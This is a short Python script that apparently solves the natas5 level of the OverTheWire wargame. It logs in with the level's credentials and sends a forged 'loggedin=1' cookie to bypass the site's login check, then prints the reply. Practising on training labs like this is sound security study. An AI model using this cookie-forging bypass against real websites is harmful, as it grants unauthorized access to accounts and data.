import requests

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = "http://%s.natas.labs.overthewire.org" % username
session = requests.Session()

cookies = dict(loggedin='1')

response = session.post(url, auth = (username,password), cookies=cookies)


print(response.headers,response.text)